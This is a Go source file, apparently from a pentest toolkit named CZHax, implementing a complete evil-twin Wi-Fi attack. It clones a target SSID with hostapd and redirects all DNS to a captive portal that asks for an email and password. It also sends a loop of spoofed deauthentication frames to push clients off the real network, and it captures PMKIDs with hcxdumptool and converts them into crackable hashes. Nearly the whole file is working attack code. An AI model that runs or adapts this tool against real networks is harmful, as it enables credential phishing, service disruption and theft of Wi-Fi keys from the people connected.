package wifi

import (
	"bufio"
	"context"
	"errors"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// EvilConfig describes an evil-twin run: a soft AP cloning a target SSID, with
// optional internet pass-through, captive portal, PMKID harvest and deauth of
// the original network.
type EvilConfig struct {
	Iface       string `json:"iface"`
	UplinkIface string `json:"uplink_iface,omitempty"`
	SSID        string `json:"ssid"`
	Channel     int    `json:"channel"`
	NAT         bool   `json:"nat"`
	Portal      bool   `json:"portal"`
	PMKID       bool   `json:"pmkid"`
	DeauthBSSID string `json:"deauth_bssid,omitempty"`

	WorkDir    string `json:"work_dir,omitempty"`
	CaptureDir string `json:"capture_dir,omitempty"`
	UID        int    `json:"uid,omitempty"`
	GID        int    `json:"gid,omitempty"`
}

// EvilGateway is the address the twin hands out as gateway and DNS server.
const EvilGateway = "192.168.66.1"

// EvilSubnet is the DHCP pool handed to clients.
const EvilSubnet = "192.168.66.10,192.168.66.200,12h"

// HostapdConfig renders the hostapd configuration for an open twin AP.
func HostapdConfig(cfg EvilConfig) string {
	ch := cfg.Channel
	if ch <= 0 {
		ch = 6
	}
	var b strings.Builder
	fmt.Fprintf(&b, "interface=%s\n", cfg.Iface)
	b.WriteString("driver=nl80211\n")
	b.WriteString("ctrl_interface=/var/run/hostapd\n")
	fmt.Fprintf(&b, "ssid=%s\n", cfg.SSID)
	b.WriteString("hw_mode=g\n")
	fmt.Fprintf(&b, "channel=%d\n", ch)
	b.WriteString("auth_algs=1\n")
	b.WriteString("wmm_enabled=0\n")
	b.WriteString("ignore_broadcast_ssid=0\n")
	b.WriteString("macaddr_acl=0\n")
	b.WriteString("ieee80211n=1\n")
	return b.String()
}

// DnsmasqConfig renders the DHCP + catch-all DNS configuration: every name
// resolves to the twin so any URL lands on the captive portal.
func DnsmasqConfig(iface, gateway string) string {
	if strings.TrimSpace(gateway) == "" {
		gateway = EvilGateway
	}
	var b strings.Builder
	fmt.Fprintf(&b, "interface=%s\n", iface)
	b.WriteString("bind-dynamic\n")
	b.WriteString("except-interface=lo\n")
	fmt.Fprintf(&b, "dhcp-range=%s\n", EvilSubnet)
	fmt.Fprintf(&b, "dhcp-option=3,%s\n", gateway)
	fmt.Fprintf(&b, "dhcp-option=6,%s\n", gateway)
	fmt.Fprintf(&b, "address=/#/%s\n", gateway)
	b.WriteString("no-resolv\n")
	b.WriteString("no-hosts\n")
	b.WriteString("log-dhcp\n")
	return b.String()
}

// PortalPage is the captive portal content shown for every request.
const PortalPage = `<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Network sign-in</title>
<style>body{font-family:system-ui,sans-serif;background:#111;color:#eee;margin:0;
display:flex;min-height:100vh;align-items:center;justify-content:center}
.card{background:#1c1c1c;border:1px solid #333;border-radius:12px;padding:24px;max-width:22rem;width:90%}
h1{font-size:1.1rem;margin:0 0 .5rem}p{color:#9ca3af;font-size:.85rem;line-height:1.5}
label{display:block;font-size:.75rem;margin:.9rem 0 .3rem;color:#9ca3af}
input{width:100%;padding:.6rem;border-radius:8px;border:1px solid #333;background:#0f0f0f;color:#eee}
button{margin-top:1rem;width:100%;padding:.7rem;border:0;border-radius:8px;background:#e5e7eb;color:#111;font-weight:600}
small{display:block;margin-top:1rem;color:#6b7280;font-size:.7rem}
</style></head><body><div class="card">
<h1>Sign in to use this network</h1>
<p>This hotspot requires confirmation before it provides internet access.</p>
<form method="post" action="/portal"><label>Email</label>
<input name="email" autocomplete="off" placeholder="you@example.com">
<label>Password</label><input name="password" type="password">
<button type="submit">Connect</button></form>
<small>Captive portal served by CZHax for authorised security testing.</small>
</div></body></html>`

// portalHandler answers every request: OS connectivity probes get a redirect,
// everything else gets the sign-in page.
func portalHandler() http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.URL.Path == "/generate_204", r.URL.Path == "/gen_204",
			r.URL.Path == "/hotspot-detect.html", r.URL.Path == "/connecttest.txt",
			r.URL.Path == "/ncsi.txt", r.URL.Path == "/redirect":
			w.Header().Set("Location", "/portal")
			w.WriteHeader(http.StatusFound)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Header().Set("Cache-Control", "no-store")
		_, _ = w.Write([]byte(PortalPage))
	})
}

// evilStreamer runs a helper binary and forwards its output line by line.
type evilStreamer struct {
	mu   sync.Mutex
	emit func(string)
}

func (s *evilStreamer) line(format string, args ...any) {
	if s.emit != nil {
		s.emit(fmt.Sprintf(format, args...))
	}
}

func (s *evilStreamer) run(ctx context.Context, bin string, args ...string) *exec.Cmd {
	cmd := exec.CommandContext(ctx, bin, args...)
	out, err := cmd.StdoutPipe()
	if err != nil {
		return nil
	}
	cmd.Stderr = cmd.Stdout
	if err := cmd.Start(); err != nil {
		s.line("%s failed: %v", bin, err)
		return nil
	}
	go func() {
		sc := bufio.NewScanner(out)
		sc.Buffer(make([]byte, 0, 4096), 64*1024)
		for sc.Scan() {
			if txt := strings.TrimSpace(sc.Text()); txt != "" {
				s.line("%s: %s", bin, txt)
			}
		}
	}()
	return cmd
}

func toolMissing(names ...string) []string {
	var missing []string
	for _, n := range names {
		if _, err := exec.LookPath(n); err != nil {
			missing = append(missing, n)
		}
	}
	return missing
}

// RunEvilTwin starts the twin and blocks until ctx is cancelled.
func RunEvilTwin(ctx context.Context, cfg EvilConfig, onLine func(string)) error {
	emit := &evilStreamer{emit: onLine}
	if strings.TrimSpace(cfg.SSID) == "" {
		return errors.New("no SSID to clone")
	}
	need := []string{"hostapd", "dnsmasq"}
	if cfg.NAT {
		need = append(need, "iptables")
	}
	if missing := toolMissing(need...); len(missing) > 0 {
		return fmt.Errorf("missing: %s", strings.Join(missing, ", "))
	}
	if cfg.Channel <= 0 {
		cfg.Channel = 6
	}

	dir := strings.TrimSpace(cfg.WorkDir)
	if dir == "" {
		dir = filepath.Join(os.TempDir(), "czhax-evil")
	}
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return err
	}
	hostapdConf := filepath.Join(dir, "hostapd.conf")
	dnsmasqConf := filepath.Join(dir, "dnsmasq.conf")
	if err := os.WriteFile(hostapdConf, []byte(HostapdConfig(cfg)), 0o600); err != nil {
		return err
	}
	if err := os.WriteFile(dnsmasqConf, []byte(DnsmasqConfig(cfg.Iface, EvilGateway)), 0o600); err != nil {
		return err
	}

	r := defaultPentestRunner()
	cleanups := make([]func(), 0, 8)
	defer func() {
		for i := len(cleanups) - 1; i >= 0; i-- {
			cleanups[i]()
		}
	}()

	// Address the AP interface and stop DHCP clients from fighting over it.
	r.setNetworkManagerManaged(cfg.Iface, false)
	_, _ = r.priv("ip", "link", "set", cfg.Iface, "down")
	_, _ = r.priv("ip", "addr", "flush", "dev", cfg.Iface)
	if out, err := r.priv("ip", "addr", "add", EvilGateway+"/24", "dev", cfg.Iface); err != nil {
		return fmt.Errorf("address %s: %s", cfg.Iface, cmdErrorText(out, err))
	}
	if out, err := r.priv("ip", "link", "set", cfg.Iface, "up"); err != nil {
		return fmt.Errorf("bring %s up: %s", cfg.Iface, cmdErrorText(out, err))
	}
	cleanups = append(cleanups, func() {
		_, _ = r.priv("ip", "addr", "flush", "dev", cfg.Iface)
		r.setNetworkManagerManaged(cfg.Iface, true)
	})

	if cfg.NAT && strings.TrimSpace(cfg.UplinkIface) != "" {
		up := cfg.UplinkIface
		_, _ = r.priv("sysctl", "-w", "net.ipv4.ip_forward=1")
		cleanups = append(cleanups, func() { _, _ = r.priv("sysctl", "-w", "net.ipv4.ip_forward=0") })
		if _, err := r.priv("iptables", "-t", "nat", "-A", "POSTROUTING", "-o", up, "-j", "MASQUERADE"); err == nil {
			cleanups = append(cleanups, func() {
				_, _ = r.priv("iptables", "-t", "nat", "-D", "POSTROUTING", "-o", up, "-j", "MASQUERADE")
			})
		}
		if _, err := r.priv("iptables", "-A", "FORWARD", "-i", cfg.Iface, "-o", up, "-j", "ACCEPT"); err == nil {
			cleanups = append(cleanups, func() {
				_, _ = r.priv("iptables", "-D", "FORWARD", "-i", cfg.Iface, "-o", up, "-j", "ACCEPT")
			})
		}
		if _, err := r.priv("iptables", "-A", "FORWARD", "-i", up, "-o", cfg.Iface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"); err == nil {
			cleanups = append(cleanups, func() {
				_, _ = r.priv("iptables", "-D", "FORWARD", "-i", up, "-o", cfg.Iface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT")
			})
		}
		emit.line("Internet pass-through %s -> %s", cfg.Iface, up)
	}

	// dnsmasq: DHCP + catch-all DNS.
	if cmd := emit.run(ctx, "dnsmasq", "-C", dnsmasqConf, "-d", "--log-facility=-"); cmd != nil {
		cleanups = append(cleanups, func() { _ = cmd.Process.Kill(); _, _ = cmd.Process.Wait() })
	}
	// hostapd: the open twin.
	time.Sleep(300 * time.Millisecond)
	if cmd := emit.run(ctx, "hostapd", hostapdConf); cmd != nil {
		cleanups = append(cleanups, func() { _ = cmd.Process.Kill(); _, _ = cmd.Process.Wait() })
	}
	emit.line("Twin AP %q up on %s (channel %d)", cfg.SSID, cfg.Iface, cfg.Channel)

	if cfg.Portal {
		srv := &http.Server{Addr: EvilGateway + ":80", Handler: portalHandler(), ReadHeaderTimeout: 5 * time.Second}
		go func() { _ = srv.ListenAndServe() }()
		cleanups = append(cleanups, func() { _ = srv.Close() })
		emit.line("Captive portal on http://%s", EvilGateway)
	}

	var mon string
	if cfg.DeauthBSSID != "" || cfg.PMKID {
		m, cerr := addMonitorOnAir(r, cfg.Iface, cfg.Channel)
		if cerr != nil {
			emit.line("monitor unavailable: %v", cerr)
		} else {
			mon = m
			cleanups = append(cleanups, func() { _, _ = r.priv("iw", "dev", mon, "del") })
		}
	}

	if cfg.DeauthBSSID != "" && mon != "" {
		go runDeauthLoop(ctx, mon, cfg.DeauthBSSID, emit)
		emit.line("Deauthing original %s", cfg.DeauthBSSID)
	}

	if cfg.PMKID && mon != "" {
		capDir := strings.TrimSpace(cfg.CaptureDir)
		if capDir == "" {
			capDir = filepath.Join(dir, "captures")
		}
		_ = os.MkdirAll(capDir, 0o755)
		out := filepath.Join(capDir, "pmkid-"+time.Now().Format("20060102-150405")+".pcapng")
		if cmd := emit.run(ctx, "hcxdumptool", "-i", mon, "-w", out, "--enable_status=1"); cmd != nil {
			cleanups = append(cleanups, func() {
				_ = cmd.Process.Kill()
				_, _ = cmd.Process.Wait()
				ChownCapture(capDir, out, cfg.UID, cfg.GID)
				emit.line("Saved %s", filepath.Base(out))
				if _, err := exec.LookPath("hcxpcapngtool"); err == nil {
					hash := strings.TrimSuffix(out, ".pcapng") + ".22000"
					if hcmd := exec.Command("hcxpcapngtool", "-o", hash, out); hcmd.Run() == nil {
						ChownCapture(capDir, hash, cfg.UID, cfg.GID)
						emit.line("Hashes: %s", filepath.Base(hash))
					}
				}
			})
		}
	}

	<-ctx.Done()
	emit.line("Stopping twin")
	return ctx.Err()
}

// addMonitorOnAir creates a monitor interface next to an interface that is
// already in AP mode (hostapd keeps the primary interface).
func addMonitorOnAir(r pentestRunner, iface string, channel int) (string, error) {
	mon := r.freeMonitorName()
	if out, err := r.priv("iw", "dev", iface, "interface", "add", mon, "type", "monitor"); err != nil {
		return "", fmt.Errorf("add monitor: %s", cmdErrorText(out, err))
	}
	if out, err := r.priv("ip", "link", "set", mon, "up"); err != nil {
		_, _ = r.priv("iw", "dev", mon, "del")
		return "", fmt.Errorf("bring %s up: %s", mon, cmdErrorText(out, err))
	}
	if err := r.setChannel(mon, channel); err != nil {
		_, _ = r.priv("iw", "dev", mon, "del")
		return "", err
	}
	return mon, nil
}

// runDeauthLoop broadcasts deauths spoofed from the original BSSID so clients
// fall back to the twin.
func runDeauthLoop(ctx context.Context, mon, bssid string, emit *evilStreamer) {
	sock, err := openPacketSocket(mon)
	if err != nil {
		emit.line("deauth: %v", err)
		return
	}
	defer sock.close()
	var seq uint16
	sent := 0
	for ctx.Err() == nil {
		frame, ferr := buildDeauthFrame(bssid, seq)
		seq++
		if ferr == nil {
			if err := sock.write(frame); err == nil {
				sent++
			}
		}
		select {
		case <-ctx.Done():
		case <-time.After(time.Second):
		}
	}
	emit.line("deauth stopped (%d frames)", sent)
}
